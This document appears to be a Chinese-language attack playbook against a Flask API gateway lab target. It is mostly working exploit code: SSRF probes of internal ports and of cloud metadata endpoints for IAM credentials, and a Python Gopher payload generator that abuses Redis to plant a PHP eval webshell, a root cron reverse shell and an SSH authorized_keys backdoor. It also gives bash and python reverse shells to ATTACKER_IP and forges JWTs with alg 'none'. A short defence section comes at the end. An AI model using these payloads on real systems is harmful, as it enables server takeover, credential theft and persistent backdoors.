# API Gateway SSRF + Redis GetShell 攻击库

## 目标信息
- **端口**: 8082
- **应用**: TechCorp API Gateway (Flask)
- **技术栈**: Flask + Redis (6379) + JWT
- **核心漏洞**: SSRF (/proxy端点) + Redis未授权访问

---

## 🔴 漏洞1: SSRF (Server-Side Request Forgery)

### 漏洞描述
`/proxy` 端点未验证 `service` 参数，允许攻击者访问任意URL，包括内网服务。

### 漏洞代码
```python
@app.route('/proxy')
def proxy():
    service = request.args.get('service', '')
    path = request.args.get('path', '/')
    
    # 漏洞：允许自定义URL
    if service in INTERNAL_SERVICES:
        target_url = INTERNAL_SERVICES[service] + path
    else:
        target_url = service + path  # ❌ 未验证，可控
    
    try:
        resp = requests.get(target_url, timeout=5)
        return Response(resp.content, status=resp.status_code)
    except Exception as e:
        return jsonify({'error': str(e)}), 502
```

### 基础利用

#### 1. 探测内网服务
```bash
# 探测Redis (6379)
curl 'http://localhost:8082/proxy?service=http://127.0.0.1:6379&path='

# 探测MySQL (3306)
curl 'http://localhost:8082/proxy?service=http://127.0.0.1:3306&path='

# 探测内网段
curl 'http://localhost:8082/proxy?service=http://172.29.0.10:8080&path=/'
```

#### 2. 端口扫描
```bash
# 批量扫描常见端口
for port in 22 80 443 3306 6379 8080 8081 9200; do
  echo -n "Port $port: "
  timeout 3 curl -s "http://localhost:8082/proxy?service=http://127.0.0.1:$port&path=" \
    && echo "OPEN" || echo "CLOSED"
done
```

#### 3. 读取云元数据
```bash
# AWS元数据
curl 'http://localhost:8082/proxy?service=http://169.254.169.254&path=/latest/meta-data/'

# AWS IAM凭证
curl 'http://localhost:8082/proxy?service=http://169.254.169.254&path=/latest/meta-data/iam/security-credentials/'

# Azure元数据
curl 'http://localhost:8082/proxy?service=http://169.254.169.254&path=/metadata/instance?api-version=2021-02-01' \
  -H "Metadata:true"

# Google Cloud元数据
curl 'http://localhost:8082/proxy?service=http://metadata.google.internal&path=/computeMetadata/v1/instance/service-accounts/default/token' \
  -H "Metadata-Flavor:Google"
```

---

## 🎯 高级攻击：Gopher + Redis 写WebShell GetShell

### 攻击原理
1. **SSRF支持Gopher协议** - 可发送原始TCP数据包
2. **Redis RESP协议** - 使用 SET + SAVE 命令写入文件
3. **写入WebShell** - 目标路径 `/var/www/html/shell.php`
4. **反弹Shell** - 通过WebShell执行命令

### Gopher Payload生成脚本

```python
#!/usr/bin/env python3
"""
生成攻击Redis的Gopher协议Payload
目标: 通过SSRF写入WebShell
"""
import urllib.parse

def generate_redis_webshell_payload(webshell_path="/var/www/html", filename="shell.php"):
    """
    生成写入WebShell的Gopher Payload
    
    参数:
        webshell_path: Web根目录路径
        filename: WebShell文件名
    """
    
    # Redis命令序列
    redis_commands = [
        "FLUSHALL",  # 清空数据库（防止干扰）
        f"CONFIG SET dir {webshell_path}",  # 设置保存目录
        f"CONFIG SET dbfilename {filename}",  # 设置文件名
        "SET webshell '<?php @eval($_POST[\"cmd\"]);?>'",  # WebShell内容
        "SAVE"  # 保存到磁盘
    ]
    
    # 转换为Redis RESP协议格式
    redis_payload = ""
    for cmd in redis_commands:
        parts = cmd.split(' ', 1)  # 分割命令和参数
        if len(parts) == 2:
            # 处理带参数的命令（如 SET key value）
            cmd_name = parts[0]
            args = parts[1].split(' ', 1)
            all_parts = [cmd_name] + args
        else:
            all_parts = [parts[0]]
        
        # RESP数组格式: *<元素数量>\r\n
        redis_payload += f"*{len(all_parts)}\r\n"
        
        # 每个元素: $<字节长度>\r\n<内容>\r\n
        for part in all_parts:
            # 移除引号
            part_clean = part.strip("'\"")
            redis_payload += f"${len(part_clean)}\r\n{part_clean}\r\n"
    
    # URL编码（Gopher需要）
    # 注意：某些字符需要保留\r\n
    encoded = urllib.parse.quote(redis_payload)
    
    # 构造完整Gopher URL
    gopher_url = f"gopher://127.0.0.1:6379/_{encoded}"
    
    return gopher_url

def generate_cron_payload(attacker_ip, attacker_port=4444):
    """生成Cron定时任务反弹Shell的Payload"""
    
    reverse_shell = f"bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1"
    
    redis_commands = [
        "FLUSHALL",
        "CONFIG SET dir /var/spool/cron",
        "CONFIG SET dbfilename root",
        f"SET cron '\\n\\n* * * * * {reverse_shell}\\n\\n'",
        "SAVE"
    ]
    
    redis_payload = ""
    for cmd in redis_commands:
        parts = cmd.split(' ', 1)
        if len(parts) == 2:
            cmd_name = parts[0]
            args = parts[1].split(' ', 1)
            all_parts = [cmd_name] + args
        else:
            all_parts = [parts[0]]
        
        redis_payload += f"*{len(all_parts)}\r\n"
        for part in all_parts:
            part_clean = part.strip("'\"")
            redis_payload += f"${len(part_clean)}\r\n{part_clean}\r\n"
    
    encoded = urllib.parse.quote(redis_payload)
    return f"gopher://127.0.0.1:6379/_{encoded}"

def generate_ssh_key_payload(ssh_public_key):
    """生成写入SSH公钥的Payload"""
    
    redis_commands = [
        "FLUSHALL",
        "CONFIG SET dir /root/.ssh",
        "CONFIG SET dbfilename authorized_keys",
        f"SET sshkey '\\n\\n{ssh_public_key}\\n\\n'",
        "SAVE"
    ]
    
    redis_payload = ""
    for cmd in redis_commands:
        parts = cmd.split(' ', 1)
        if len(parts) == 2:
            cmd_name = parts[0]
            args = parts[1].split(' ', 1)
            all_parts = [cmd_name] + args
        else:
            all_parts = [parts[0]]
        
        redis_payload += f"*{len(all_parts)}\r\n"
        for part in all_parts:
            part_clean = part.strip("'\"")
            redis_payload += f"${len(part_clean)}\r\n{part_clean}\r\n"
    
    encoded = urllib.parse.quote(redis_payload)
    return f"gopher://127.0.0.1:6379/_{encoded}"


if __name__ == "__main__":
    import sys
    
    print("=== Redis Gopher Payload 生成器 ===\n")
    
    # 方案1: WebShell
    print("[1] WebShell Payload")
    webshell_gopher = generate_redis_webshell_payload()
    print(f"Gopher URL: {webshell_gopher[:100]}...\n")
    
    # 构造SSRF攻击URL
    ssrf_url = f"http://localhost:8082/proxy?service={urllib.parse.quote(webshell_gopher)}&path="
    print(f"完整攻击URL: {ssrf_url[:150]}...")
    print(f"\n使用方法:")
    print(f'curl "{ssrf_url}"')
    print(f'curl http://target/shell.php -d "cmd=system(\'id\');"')
    print()
    
    # 方案2: Cron定时任务
    if len(sys.argv) > 1:
        attacker_ip = sys.argv[1]
        print(f"\n[2] Cron反弹Shell Payload (攻击者IP: {attacker_ip})")
        cron_gopher = generate_cron_payload(attacker_ip)
        cron_ssrf = f"http://localhost:8082/proxy?service={urllib.parse.quote(cron_gopher)}&path="
        print(f'curl "{cron_ssrf}"')
        print(f"nc -lvnp 4444  # 监听端口")
```

### 完整攻击步骤

#### Step 1: 探测Redis是否开放
```bash
curl 'http://localhost:8082/proxy?service=http://127.0.0.1:6379&path='

# 确认Redis存活
curl -s 'http://localhost:8082/cache/health'
# 响应: {"status": "healthy", "backend": "redis"}
```

#### Step 2: 生成Gopher Payload
```bash
# 保存上面的Python脚本为 generate_gopher.py
python3 generate_gopher.py > attack_payload.txt

# 或者手动构造简化版
cat << 'EOF' > simple_payload.py
import urllib.parse

# 简化的WebShell写入命令
payload = """*1\r
$8\r
FLUSHALL\r
*3\r
$3\r
SET\r
$1\r
x\r
$30\r
<?php @eval($_POST["cmd"]);?>\r
*4\r
$6\r
CONFIG\r
$3\r
SET\r
$3\r
dir\r
$13\r
/var/www/html\r
*4\r
$6\r
CONFIG\r
$3\r
SET\r
$10\r
dbfilename\r
$9\r
shell.php\r
*1\r
$4\r
SAVE\r
"""

gopher_url = "gopher://127.0.0.1:6379/_" + urllib.parse.quote(payload.replace('\r\n', '\r\n'))
ssrf_url = "http://localhost:8082/proxy?service=" + urllib.parse.quote(gopher_url) + "&path="
print(ssrf_url)
EOF

python3 simple_payload.py
```

#### Step 3: 发送攻击请求
```bash
# 读取生成的攻击URL
ATTACK_URL=$(python3 generate_gopher.py | grep "完整攻击URL" | cut -d: -f2-)

# 发送攻击
curl "$ATTACK_URL"

# 或者直接
curl "http://localhost:8082/proxy?service=gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A3%0D%0A%243%0D%0ASET%0D%0A%241%0D%0Ax%0D%0A%2430%0D%0A%3C%3Fphp%20%40eval%28%24_POST%5B%22cmd%22%5D%29%3B%3F%3E%0D%0A%2A1%0D%0A%244%0D%0ASAVE%0D%0A&path="
```

#### Step 4: 验证WebShell
```bash
# 假设目标服务器Web根目录是 /var/www/html
# WebShell路径: http://target-server/shell.php

# 测试命令执行
curl http://target-server/shell.php -d "cmd=system('id');"
curl http://target-server/shell.php -d "cmd=system('whoami');"
curl http://target-server/shell.php -d "cmd=system('pwd');"
```

#### Step 5: 反弹Shell
```bash
# 在攻击机监听
nc -lvnp 4444

# 在另一个终端发送反弹Shell命令
curl http://target-server/shell.php \
  -d "cmd=system('bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"');"

# 或者使用Python反弹
curl http://target-server/shell.php \
  -d "cmd=system('python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"ATTACKER_IP\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/bash\\\",\\\"-i\\\"])\"');"
```

---

## 替代攻击方案

### 方案2: Cron定时任务反弹Shell

**优点**: 不依赖Web目录，更隐蔽

```bash
# 生成Cron Payload
python3 << 'EOF'
import urllib.parse

attacker_ip = "YOUR_IP"
attacker_port = "4444"

redis_cmds = f"""*1\r
$8\r
FLUSHALL\r
*4\r
$6\r
CONFIG\r
$3\r
SET\r
$3\r
dir\r
$16\r
/var/spool/cron\r
*4\r
$6\r
CONFIG\r
$3\r
SET\r
$10\r
dbfilename\r
$4\r
root\r
*3\r
$3\r
SET\r
$1\r
x\r
$60\r


* * * * * bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1


\r
*1\r
$4\r
SAVE\r
"""

gopher = "gopher://127.0.0.1:6379/_" + urllib.parse.quote(redis_cmds)
print("http://localhost:8082/proxy?service=" + urllib.parse.quote(gopher) + "&path=")
EOF

# 监听端口
nc -lvnp 4444

# 发送攻击（每分钟执行一次）
```

### 方案3: SSH公钥写入

**优点**: 持久化访问

```bash
# 1. 生成SSH密钥对
ssh-keygen -t rsa -b 2048 -f /tmp/redis_key -N ""

# 2. 读取公钥
PUB_KEY=$(cat /tmp/redis_key.pub)

# 3. 生成Payload
python3 << EOF
import urllib.parse

pub_key = """$PUB_KEY"""

redis_cmds = f"""*1\r
\$8\r
FLUSHALL\r
*4\r
\$6\r
CONFIG\r
\$3\r
SET\r
\$3\r
dir\r
\$10\r
/root/.ssh\r
*4\r
\$6\r
CONFIG\r
\$3\r
SET\r
\$10\r
dbfilename\r
\$15\r
authorized_keys\r
*3\r
\$3\r
SET\r
\$1\r
x\r
\${len(pub_key) + 4}\r


{pub_key}


\r
*1\r
\$4\r
SAVE\r
"""

gopher = "gopher://127.0.0.1:6379/_" + urllib.parse.quote(redis_cmds)
print("http://localhost:8082/proxy?service=" + urllib.parse.quote(gopher) + "&path=")
EOF

# 4. 发送攻击后登录
ssh -i /tmp/redis_key root@target-server
```

---

## 🔴 漏洞2: JWT Algorithm='none' 绕过

### 漏洞描述
JWT验证时允许 `algorithm='none'`，攻击者可伪造无签名Token绕过验证。

### 漏洞代码
```python
@app.route('/admin/dashboard')
def admin_dashboard():
    token = request.headers.get('Authorization', '')[7:]
    
    # ❌ 允许algorithm='none'（仅PyJWT 1.x）
    payload = jwt.decode(token, SECRET_KEY, algorithms=['HS256', 'none'])
    
    if payload.get('role') != 'admin':
        return jsonify({'error': 'Insufficient privileges'}), 403
```

### 利用方法（仅适用PyJWT 1.x）

```python
#!/usr/bin/env python3
import json
import base64

def create_none_jwt(payload):
    """创建algorithm='none'的JWT"""
    header = {"alg": "none", "typ": "JWT"}
    
    h = base64.urlsafe_b64encode(
        json.dumps(header, separators=(',', ':')).encode()
    ).decode().rstrip('=')
    
    p = base64.urlsafe_b64encode(
        json.dumps(payload, separators=(',', ':')).encode()
    ).decode().rstrip('=')
    
    # 无签名，结尾是空字符串（但保留点号）
    return f"{h}.{p}."

# 伪造管理员Token
admin_payload = {
    "username": "fake_admin",
    "role": "admin",
    "exp": 9999999999
}

admin_token = create_none_jwt(admin_payload)
print(f"伪造Token: {admin_token}")
```

使用伪造Token：
```bash
FAKE_TOKEN="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImZha2VfYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJleHAiOjk5OTk5OTk5OTl9."

curl http://localhost:8082/admin/dashboard \
  -H "Authorization: Bearer $FAKE_TOKEN"
```

**注意**: PyJWT 2.x 已默认禁用此漏洞，需降级到1.x版本才能利用。

---

## 完整攻击链组合

### 场景: 从SSRF到完全控制服务器

```bash
# ===== 第一阶段：信息收集 =====
# 1. 探测内网服务
curl 'http://localhost:8082/proxy?service=http://127.0.0.1:6379&path='
curl 'http://localhost:8082/cache/health'

# 2. 端口扫描
for port in {6379,3306,8080,9200}; do
  echo "Testing $port..."
  curl -s "http://localhost:8082/proxy?service=http://127.0.0.1:$port&path=" | head -3
done

# ===== 第二阶段：利用SSRF攻击Redis =====
# 3. 生成Gopher Payload写WebShell
python3 generate_gopher.py > /tmp/attack_url.txt

# 4. 发送攻击
ATTACK_URL=$(cat /tmp/attack_url.txt)
curl "$ATTACK_URL"

# ===== 第三阶段：GetShell =====
# 5. 访问WebShell
curl http://target-server/shell.php -d "cmd=whoami"
curl http://target-server/shell.php -d "cmd=uname -a"

# 6. 反弹Shell
nc -lvnp 4444  # 监听端口

curl http://target-server/shell.php \
  -d "cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"

# ===== 第四阶段：权限维持 =====
# 7. 写入SSH公钥（持久化）
# 8. 创建Cron定时任务（隐蔽后门）
```

---

## 防御建议

### 1. SSRF防护

```python
# 严格白名单
ALLOWED_SERVICES = ['user-service', 'payment-service', 'admin-panel']
INTERNAL_SERVICES_URLS = {
    'user-service': 'http://172.29.0.10:8080',
    'payment-service': 'http://172.29.0.11:8080',
    'admin-panel': 'http://172.29.0.12:8080'
}

@app.route('/proxy')
def proxy():
    service = request.args.get('service', '')
    path = request.args.get('path', '/')
    
    # 只允许白名单服务
    if service not in ALLOWED_SERVICES:
        return jsonify({'error': 'Invalid service'}), 400
    
    target_url = INTERNAL_SERVICES_URLS[service] + path
    
    # 禁止协议重定向
    resp = requests.get(target_url, timeout=5, allow_redirects=False)
    return Response(resp.content, status=resp.status_code)
```

**额外防护措施**:
```python
import ipaddress
from urllib.parse import urlparse

def is_safe_url(url):
    """检查URL是否安全"""
    try:
        parsed = urlparse(url)
        
        # 只允许HTTP/HTTPS
        if parsed.scheme not in ['http', 'https']:
            return False
        
        # 解析IP地址
        ip = ipaddress.ip_address(parsed.hostname)
        
        # 禁止内网IP
        if ip.is_private or ip.is_loopback or ip.is_link_local:
            return False
        
        # 禁止保留地址
        if ip.is_reserved:
            return False
        
        return True
    except:
        return False
```

### 2. Redis加固

```bash
# /etc/redis/redis.conf

# 1. 设置强密码
requirepass your_very_strong_password_here_min_32_chars

# 2. 绑定本地（禁止外网访问）
bind 127.0.0.1 ::1

# 3. 禁用危险命令
rename-command CONFIG ""
rename-command FLUSHALL ""
rename-command FLUSHDB ""
rename-command SAVE ""
rename-command BGSAVE ""
rename-command SHUTDOWN ""
rename-command DEBUG ""

# 4. 启用保护模式
protected-mode yes

# 5. 禁止以root运行
# 创建专用用户
# useradd -r -s /bin/false redis
```

### 3. JWT安全

```python
# 只允许强签名算法
payload = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])

# 或者使用非对称加密
payload = jwt.decode(token, PUBLIC_KEY, algorithms=['RS256'])

# 额外验证
if jwt.get_unverified_header(token).get('alg') == 'none':
    return jsonify({'error': 'Invalid algorithm'}), 401
```

### 4. 网络隔离

```bash
# 使用iptables限制Redis访问
iptables -A INPUT -p tcp --dport 6379 -s 127.0.0.1 -j ACCEPT
iptables -A INPUT -p tcp --dport 6379 -j DROP

# Docker网络隔离
docker network create --internal redis-internal
docker run --network redis-internal redis
```

---

## 相关CVE

- **SSRF**: CVE-2021-26855 (Microsoft Exchange ProxyLogon)
- **JWT None**: CVE-2015-9235, CVE-2018-1000531
- **Redis未授权**: CVE-2022-0543 (Lua沙箱逃逸)
- **Gopher SSRF**: CVE-2017-9506 (Jira SSRF)

---

## 工具推荐

- **SSRFmap** - 自动化SSRF利用框架
- **Gopherus** - Gopher协议Payload生成器
- **jwt_tool** - JWT安全测试工具
- **redis-rogue-server** - Redis主从复制RCE工具

---

## 参考链接

- [Redis Security](https://redis.io/topics/security)
- [OWASP SSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [JWT Best Practices](https://tools.ietf.org/html/rfc8725)
- [Gopher Protocol Exploitation](https://blog.chaitin.cn/gopher-attack-surfaces/)

---

**文档版本**: 1.0  
**创建时间**: 2025-11-22  
**适用场景**: API Gateway、微服务架构、Redis缓存系统
